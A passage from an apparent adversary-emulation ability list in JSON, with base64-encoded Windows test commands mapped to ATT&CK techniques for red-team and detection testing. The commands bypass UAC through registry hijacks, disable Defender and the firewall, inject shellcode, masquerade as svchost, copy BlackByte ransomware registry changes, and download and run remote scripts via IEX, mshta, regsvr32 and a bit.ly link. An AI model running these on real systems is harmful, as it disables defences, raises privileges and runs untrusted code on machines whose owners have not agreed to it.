["bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iT3BlbiBQb3J0IHRvIEFueSIgfCBPdXQtTnVsbA=="], "executor": "psh", "access": {}, "description": "This test will attempt to open a local port defined by input arguments to any profile", "variations": []}, {"test": "JE5hbWVTcGFjZSA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSAicm9vdCIgLUNsYXNzICJfX05hbWVzcGFjZSIgfCBTZWxlY3QgTmFtZSB8IE91dC1TdHJpbmcgLVN0cmVhbSB8IFNlbGVjdC1TdHJpbmcgIlNlY3VyaXR5Q2VudGVyIjskU2VjdXJpdHlDZW50ZXIgPSAkTmFtZVNwYWNlIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTtHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2UgInJvb3RcJFNlY3VyaXR5Q2VudGVyIiAtQ2xhc3MgQW50aVZpcnVzUHJvZHVjdCB8IFNlbGVjdCBEaXNwbGF5TmFtZSwgSW5zdGFuY2VHdWlkLCBQYXRoVG9TaWduZWRQcm9kdWN0RXhlLCBQYXRoVG9TaWduZWRSZXBvcnRpbmdFeGUsIFByb2R1Y3RTdGF0ZSwgVGltZXN0YW1wIHwgRm9ybWF0LUxpc3Q7", "ability_id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777", "technique_name": "Software Discovery: Security Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518.001", "platform": "windows", "name": "Identify Firewalls", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify Firewalls", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVwzMyBBa2FnaTY0LmV4ZSI=", "ability_id": "89f71445dda60b4f8efc76e728e5ac65", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 33", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "bmV0IHVzZXIgL2RvbWFpbiAmJiBuZXQgZ3JvdXAgL2RvbWFpbg==", "ability_id": "ee41528024c63881b53302e996a79020", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Enumerate all accounts (Domain)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n", "variations": []}, {"test": "bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGN1cnJlbnRwcm9maWxlIHN0YXRlIG9mZg==", "ability_id": "5b93df032e230056c21a3e57334f77d1", "technique_name": "Impair Defenses: Disable or Modify System Firewall", "additional_info": {}, "privilege": "", "technique_id": "T1562.004", "platform": "windows", "name": "Disable Microsoft Defender Firewall", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGN1cnJlbnRwcm9maWxlIHN0YXRlIG9uID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n", "variations": []}, {"test": "cmVnLmV4ZSBhZGQgaGtjdVxzb2Z0d2FyZVxjbGFzc2VzXG1zY2ZpbGVcc2hlbGxcb3Blblxjb21tYW5kIC92ZSAvZCAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAvZiAmJiBjbWQuZXhlIC9jIGV2ZW50dndyLm1zYw==", "ability_id": "f76013db08bdef5b66f24c93a44c678c", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC using Event Viewer (cmd)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnLmV4ZSBkZWxldGUgaGtjdVxzb2Z0d2FyZVxjbGFzc2VzXG1zY2ZpbGUgL2YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n", "variations": []}, {"test": "bmV0IHZpZXcgL2RvbWFpbiAmJiBuZXQgdmlldw==", "ability_id": "f3c05269abfec53a1ea9b6d75dcce176", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Remote System Discovery - net", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n", "variations": []}, {"test": "dGFza2tpbGwuZXhlIC9mIC9pbSBzcG9vbHN2LmV4ZQ==", "ability_id": "282fc06f224e89fa1913bc11bdf18a20", "technique_name": "Service Stop", "additional_info": {}, "privilege": "", "technique_id": "T1489", "platform": "windows", "name": "Windows - Stop service by killing process", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "variations": []}, {"test": "Y29weSAxZGI5MGJfVDEwMzYuMDAzLmV4ZSAoJGVudjpURU1QICsgIlxzdmNob3N0LmV4ZSIpOyAkbXlUMTAzNl8wMDMgPSAoU3RhcnQtUHJvY2VzcyAtUGFzc1RocnUgLUZpbGVQYXRoICgkZW52OlRFTVAgKyAiXHN2Y2hvc3QuZXhlIikpLklkOyBTdG9wLVByb2Nlc3MgLUlEICRteVQxMDM2XzAwMw==", "ability_id": "f5ef8466e5ebcd2ae03f338d9416069c", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "Masquerading - non-windows exe running as windows exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["1db90b_T1036.003.exe"], "cleanup": ["UmVtb3ZlLUl0ZW0gKCRlbnY6VEVNUCArICJcc3ZjaG9zdC5leGUiKSAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICIxZGI5MGJfVDEwMzYuMDAzLmV4ZSI="], "executor": "psh", "access": {}, "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1NYWxkb2MgLW1hY3JvRmlsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclxUMTA1NVxzcmNceDY0XFQxMDU1LW1hY3JvY29kZS50eHQiIC1vZmZpY2VQcm9kdWN0ICJXb3JkIiAtc3ViICJFeGVjdXRlIg==", "ability_id": "c2c084cc438ee70fe64355d6a9bcf354", "technique_name": "Process Injection", "additional_info": {}, "privilege": "", "technique_id": "T1055", "platform": "windows", "name": "Shellcode execution via VBA", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n", "variations": []}, {"test": "QzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIC9jICJtc2h0YS5leGUgamF2YXNjcmlwdDphPUdldE9iamVjdCgnc2NyaXB0Omh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEwNTkuMDAxL3NyYy9tc2h0YS5zY3QnKS5FeGVjKCk7Y2xvc2UoKSI=", "ability_id": "6efbccc1869e8cd618c0d3ecda407d5f", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Powershell invoke mshta.exe download", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "variations": []}, {"test": "Y2QgIiVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJccGxhdGZvcm1cNC4xOCoiICYmIE1wQ21kUnVuLmV4ZSAtRG93bmxvYWRGaWxlIC11cmwgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvTElDRU5TRS50eHQgLXBhdGggJXRlbXAlXEF0b21pYy1saWNlbnNlLnR4dA==", "ability_id": "401cae7533e792cc8679cc8e3faba6e6", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Download a File with Windows Defender MpCmdRun.exe", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxBdG9taWMtbGljZW5zZS50eHQgPm51bCAyPiYxICYmIGRlbCAldGVtcCVcTXBDbWRSdW4ubG9nID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Uses the Windows Defender to download a file from the internet (must have version 4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZykgOyBJbnZva2UtTWFsRG9jIC1tYWNyb0ZpbGUgIlBhdGhUb0F0b21pY3NGb2xkZXJcVDEwNTUuMDEyXHNyY1xUMTA1NS4wMTItbWFjcm9jb2RlLnR4dCIgLW9mZmljZVByb2R1Y3QgIldvcmQiIC1zdWIgIkV4cGxvaXQi", "ability_id": "edcae1b254a8bd61c497f63a82ee5cc0", "technique_name": "Process Injection: Process Hollowing", "additional_info": {}, "privilege": "", "technique_id": "T1055.012", "platform": "windows", "name": "RunPE via VBA", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module executes notepad.exe from within the WINWORD.EXE process\n", "variations": []}, {"test": "bmV0IGxvY2FsZ3JvdXAgJiYgbmV0IGdyb3VwIC9kb21haW4gJiYgbmV0IGdyb3VwICJkb21haW4gYWRtaW5zIiAvZG9tYWluICYmIG5ldCBncm91cCAiZW50ZXJwcmlzZSBhZG1pbnMiIC9kb21haW4=", "ability_id": "6103e503cb444bc7b4187704f2035708", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Basic Permission Groups Discovery Windows (Domain)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3QgLU91dEZpbGUgQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEZXNrdG9wXFRlYW1WaWV3ZXJfU2V0dXAuZXhlIGh0dHBzOi8vZG93bmxvYWQudGVhbXZpZXdlci5jb20vZG93bmxvYWQvVGVhbVZpZXdlcl9TZXR1cC5leGU7ICRmaWxlMSA9ICJDOlxVc2Vyc1wiICsgJGVudjp1c2VybmFtZSArICJcRGVza3RvcFxUZWFtVmlld2VyX1NldHVwLmV4ZSI7IFN0YXJ0LVByb2Nlc3MgLVdhaXQgJGZpbGUxIC9TOyA7IFN0YXJ0LVByb2Nlc3MgJ0M6XFByb2dyYW0gRmlsZXMgKHg4NilcVGVhbVZpZXdlclxUZWFtVmlld2VyLmV4ZSc=", "ability_id": "f50ec080343f1bec4e739dd20675c349", "technique_name": "Remote Access Software", "additional_info": {}, "privilege": "", "technique_id": "T1219", "platform": "windows", "name": "TeamViewer Files Detected Test on Windows", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGZpbGUgPSAnQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxUZWFtVmlld2VyXHVuaW5zdGFsbC5leGUnOyBpZihUZXN0LVBhdGggJGZpbGUpeyBTdGFydC1Qcm9jZXNzICRmaWxlICIvUyIgLUVycm9yQWN0aW9uIElnbm9yZSB8IE91dC1OdWxsIH07ICRmaWxlMSA9ICJDOlxVc2Vyc1wiICsgJGVudjp1c2VybmFtZSArICJcRGVza3RvcFxUZWFtVmlld2VyX1NldHVwLmV4ZSI7IFJlbW92ZS1JdGVtICRmaWxlMSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw="], "executor": "psh", "access": {}, "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n", "variations": []}, {"test": "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWU7U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlO1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlO1NldC1NcFByZWZlcmVuY2UgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQ7", "ability_id": "b007f6e8-4a87-4440-8888-29ceab047d9b", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "Elevated", "technique_id": "T1562.001", "platform": "windows", "name": "Disable Windows Defender All", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJGZhbHNlOwpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSU9BVlByb3RlY3Rpb24gJGZhbHNlOwpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICRmYWxzZTsKU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICRmYWxzZTsKU2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBFbmFibGVkOw=="], "executor": "psh", "access": {}, "description": "Disable Windows Defender All", "variations": []}, {"test": "c3lzdGVtaW5mbyAmJiByZWcgcXVlcnkgSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcRGlza1xFbnVt", "ability_id": "dca8b042fcdffcc1f5cddcff4122c434", "technique_name": "System Information Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1082", "platform": "windows", "name": "System Information Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n", "variations": []}, {"test": "JE9yaWdpbmFsQ29tbWFuZCA9ICdXcml0ZS1Ib3N0ICJIZXksIEF0b21pYyEiJzsgJEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkT3JpZ2luYWxDb21tYW5kKTsgJEVuY29kZWRDb21tYW5kID1bQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRCeXRlcyk7ICRFbmNvZGVkQ29tbWFuZDsgcG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kICRFbmNvZGVkQ29tbWFuZA==", "ability_id": "2e60ce3b2b9edcbec108a9abda95fa6f", "technique_name": "Obfuscated Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1027", "platform": "windows", "name": "Execute base64-encoded PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n", "variations": []}, {"test": "bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9InJlbW90ZSBkZXNrdG9wIiBuZXcgZW5hYmxlPVllcyAmJiBuZXRzaCBhZHZmaXJld2FsbCBmaXJld2FsbCBzZXQgcnVsZSBncm91cD0iZmlsZSBhbmQgcHJpbnRlciBzaGFyaW5nIiBuZXcgZW5hYmxlPVllcw==", "ability_id": "280003641a5cddf916c4f2bf605a71d3", "technique_name": "Impair Defenses: Disable or Modify System Firewall", "additional_info": {}, "privilege": "", "technique_id": "T1562.004", "platform": "windows", "name": "Allow SMB and RDP on Microsoft Defender Firewall", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0c2ggYWR2ZmlyZXdhbGwgcmVzZXQgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n", "variations": []}, {"test": "bmV0LmV4ZSBzdG9wIHNwb29sZXI=", "ability_id": "8ff28ff3d519f5d742ef8064787936a2", "technique_name": "Service Stop", "additional_info": {}, "privilege": "", "technique_id": "T1489", "platform": "windows", "name": "Windows - Stop service using net.exe", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0LmV4ZSBzdGFydCBzcG9vbGVyID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "variations": []}, {"test": "Y21kLmV4ZSAvYyByZWcgYWRkIEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIC92IExvY2FsQWNjb3VudFRva2VuRmlsdGVyUG9saWN5IC90IFJFR19EV09SRCAvZCAxIC9mICYmIGNtZC5leGUgL2MgcmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBFbmFibGVMaW5rZWRDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMSAvZiAmJiBjbWQuZXhlIC9jIHJlZyBhZGQgSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxGaWxlU3lzdGVtIC92IExvbmdQYXRoc0VuYWJsZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=", "ability_id": "e7a987cbef27263e666e5b096488dc55", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "BlackByte Ransomware Registry Changes - CMD", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbVwgL3YgTG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3kgL2YgPm51bCAyPiYxICYmIHJlZyBkZWxldGUgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW1cIC92IEVuYWJsZUxpbmtlZENvbm5lY3Rpb25zIC9mID5udWwgMj4mMSAmJiByZWcgZGVsZXRlIEhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcRmlsZVN5c3RlbVwgL3YgTG9uZ1BhdGhzRW5hYmxlZCAvZiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n", "variations": []}, {"test": "QzpcV2luZG93c1xzeXN0ZW0zMlxyZWdzdnIzMi5leGUgL3MgL3UgL2k6aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIxOC4wMTAvc3JjL1JlZ1N2cjMyLnNjdCBzY3JvYmouZGxs", "ability_id": "0eb7887e6df6b2f411693c6f994adb73", "technique_name": "Signed Binary Proxy Execution: Regsvr32", "additional_info": {}, "privilege": "", "technique_id": "T1218.010", "platform": "windows", "name": "Regsvr32 remote COM scriptlet execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n", "variations": []}, {"test": "d3JpdGUtaG9zdCAiUmVtb3RlIGRvd25sb2FkIG9mIFNoYXJwSG91bmQucHMxIGludG8gbWVtb3J5LCBmb2xsb3dlZCBieSBleGVjdXRpb24gb2YgdGhlIHNjcmlwdCIgLUZvcmVncm91bmRDb2xvciBDeWFuOyBJRVggKE5ldy1PYmplY3QgTmV0LldlYmNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CbG9vZEhvdW5kQUQvQmxvb2RIb3VuZC84MDQ1MDM5NjJiNmRjNTU0YWQ3ZDMyNGNmYTdmMmI0YTU2NmExNGUyL0luZ2VzdG9ycy9TaGFycEhvdW5kLnBzMScpOzsgSW52b2tlLUJsb29kSG91bmQgLU91dHB1dERpcmVjdG9yeSAkZW52OlRlbXA7IFN0YXJ0LVNsZWVwIDU=", "ability_id": "0ecc3d4729cf37c719528291d63f9f99", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Run Bloodhound from Memory using Download Cradle", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpUZW1wXCpCbG9vZEhvdW5kLnppcCAtRm9yY2U="], "executor": "psh", "access": {}, "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "variations": []}, {"test": "cG93ZXJzaGVsbC5leGUgLWMgSUVYIChOZXctT2JqZWN0IE5ldC5XZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCJodHRwczovL2JpdC5seS8zM0gwUVhpIik=", "ability_id": "bfff9006-d1fb-46ce-b173-92cb04e9a031", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell bitly Link Download", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Download", "variations": []}, {"test": "cHl0aG9uMyAtLXZlcnNpb24mcHl0aG9uMiAtLXZlcnNpb24mcHl0aG9uIC0tdmVyc2lvbg==", "ability_id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5", "technique_name": "Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518", "platform": "windows", "name": "Check Python", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Check to see what version of python is installed", "variations": []}, {"test": "Z2V0LXByb2Nlc3MgfCA/eyRfLkRlc2NyaXB0aW9uIC1saWtlICIqdmlydXMqIn07IGdldC1wcm9jZXNzIHwgP3skXy5EZXNjcmlwdGlvbiAtbGlrZSAiKmNhcmJvbmJsYWNrKiJ9OyBnZXQtcHJvY2VzcyB8ID97JF8uRGVzY3JpcHRpb24gLWxpa2UgIipkZWZlbmRlcioifTsgZ2V0LXByb2Nlc3MgfCA/eyRfLkRlc2NyaXB0aW9uIC1saWtlICIqY3lsYW5jZSoifQ==", "ability_id": "b8453a5fe06b24aea12b27592d5c3d3a", "technique_name": "Software Discovery: Security Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518.001", "platform": "windows", "name": "Security Software Discovery - powershell", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\n", "variations": []}, {"test": "bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iYXRvbWljIHRlc3RpbmciIGFjdGlvbj1hbGxvdyBkaXI9aW4gcHJvdG9jb2w9VENQIGxvY2FscG9ydD00NTA=", 